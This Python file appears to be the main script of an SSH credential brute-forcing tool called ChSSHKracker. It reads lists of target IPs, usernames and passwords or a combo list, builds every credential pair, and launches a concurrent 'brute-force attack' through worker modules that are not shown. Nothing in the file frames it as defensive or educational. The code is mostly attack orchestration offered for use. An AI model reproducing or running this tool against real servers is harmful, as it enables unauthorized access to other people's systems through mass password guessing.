# -*- UTF-8 -*-
# ChSshKracker.py

import os
import sys
import signal
import time
try:
    import paramiko
    from colorama import Fore, init
    from prompt_toolkit import prompt
    init(autoreset=True)
except ImportError:
    sys.exit('\n [ - ] Please install requirements libraries. Using commands below:\n' \
             '\t- python -m pip install cryptography==40.0.2 paramiko==2.11.0 colorama==0.4.6 prompt_toolkit==3.0.52\n' \
             '\t- Or\n' \
             '\t- python -m pip install -r requirements.txt\n'
            )

from core.worker import Worker
from core.config import (
    Config,
    FILE_PATH,
    _total_tasks,
    _stop_event
)

from utils.file_manager import FileManager
from ui.decorators import MsgDCR
from ui.summary_render import SummaryRenderer, GetSummary
from ui.banner import Banners
from utils.utility import utility as utils
from cli.parser import Parser
from cli.interactive import InteractiveUI


def handle_SIGINT(frm, func):
    print()
    MsgDCR.FailureMessage('Program Interrupted By User!')
    _stop_event.set()
    os.kill(os.getpid(), signal.SIGTERM)

signal.signal(signal.SIGINT, handle_SIGINT)

sys.stderr = open(os.devnull, 'w')

class ChSSHKracker:
    def __init__(self) -> None:
        self.summary_obj = SummaryRenderer(
                    title='Configuration Summary', 
                    space=5, 
                    global_margin_left_spaces=2,
                    max_width=80
        )
        self.parser_obj = Parser()
        self.interactive_obj = InteractiveUI()

    def run(self):
        args = self.parser_obj.build_parser()

        ip_list = args.ip_list
        user_list = args.user_list
        password_list = args.password_list
        combo_list = args.combo_list
        timeout = args.timeout
        max_workers = args.workers
        per_worker = args.per_worker
        interactive_flag = args.interactive

        if (not interactive_flag):
            if (ip_list):
                if ((not os.path.isfile(ip_list)) or (not os.path.exists(ip_list))):
                    MsgDCR.FailureMessage(f'IP list does not exist: {ip_list}')
                    sys.exit(2)

                Config.IP_FILE = os.path.realpath(ip_list)
            else:
                print(self.parser_obj.render_help())
                sys.exit(2)
        
            if (combo_list):
                if ((not os.path.isfile(combo_list)) or (not os.path.exists(combo_list))):
                    MsgDCR.FailureMessage(f'Combo list does not exist: {combo_list}')
                    sys.exit(2)
                combo_list_path = os.path.realpath(combo_list)
                try:
                    self.parse_combos = FileManager.parse_combo(combo_list_path)
                except Exception:
                    MsgDCR.FailureMessage('Error on loading combo list')
                    sys.exit(2)
                Config.USE_COMBO = True
                Config.COMBO_FILE = combo_list_path
            
            else:
                Config.USE_COMBO = False
                Config.COMBO_FILE = os.path.realpath(FILE_PATH.COMBO_FILE)

                if (user_list):
                    if ((not os.path.isfile(user_list)) or (not os.path.exists(user_list))):
                        MsgDCR.FailureMessage(f'Username list does not exist: {user_list}')
                        sys.exit(2)
                    
                    Config.USERNAME_FILE = os.path.realpath(user_list)
                else:
                    MsgDCR.FailureMessage('Username list is required if your not using combo file')
                    sys.exit(1)

                if (password_list):
                    if ((not os.path.isfile(password_list)) or (not os.path.exists(password_list))):
                        MsgDCR.FailureMessage(f'Password list does not exist: {password_list}')
                        sys.exit(2)
                    Config.PASSWORD_FILE = os.path.realpath(password_list)
                else:
                    MsgDCR.FailureMessage('Password list is required if your not using combo file')
                    sys.exit(1)
            
            if (timeout):
                if (int(timeout) < 1):
                    MsgDCR.FailureMessage('Please enter valid positive integer for timeout')
                    sys.exit(2)
                Config.TIMEOUT = timeout
            
            if (max_workers):
                if (int(max_workers) < 1):
                    MsgDCR.FailureMessage('Please enter valid positive integer for workers')
                    sys.exit(2)
                Config.MAX_WORKERS = max_workers
            
            if (per_worker):
                if (int(per_worker) < 1):
                    MsgDCR.FailureMessage('Please enter valid positive integer for per worker')
                    sys.exit(2)
                Config.CONCURRENT_PER_WORKER = per_worker
        
        else:
            MsgDCR.InfoMessage('Interactive mode has been detected!')
            self.interactive_obj.run()
        
        utils.clear_screen()
        print(Banners.MainBanner())

        if not Config.USE_COMBO:
            try:
                FileManager.create_combo_file(Config.USERNAME_FILE, Config.PASSWORD_FILE, Config.COMBO_FILE)
                MsgDCR.SuccessMessage(f'Combo list created at: {Config.COMBO_FILE}')
                self.parse_combos = FileManager.parse_combo(Config.COMBO_FILE)
                MsgDCR.InfoMessage(f'Total combos loaded from generated combo file: {len(self.parse_combos)}')
                time.sleep(2)
            except Exception:
                MsgDCR.FailureMessage('Error on creating combo list')
                sys.exit(1)
        
        try:
            self.parse_target_ips = FileManager.parse_targets(Config.IP_FILE)
            MsgDCR.InfoMessage(f'Total target IPs loaded from IP list: {len(self.parse_target_ips)}')
            time.sleep(2)
        except Exception:
            MsgDCR.FailureMessage('Error on loading IP list')
            sys.exit(1)
        
        _total_tasks = (len(self.parse_combos) * len(self.parse_target_ips))

        MsgDCR.InfoMessage('Starting the brute-force attack...')
        time.sleep(2)

        worker = Worker(
            combos=self.parse_combos, 
            targets=self.parse_target_ips, 
            total_tasks=_total_tasks, 
            timeout=Config.TIMEOUT, 
            max_workers=Config.MAX_WORKERS,
            per_worker=Config.CONCURRENT_PER_WORKER
        )
        worker.run()


if __name__ == '__main__':
    app = ChSSHKracker()
    app.run()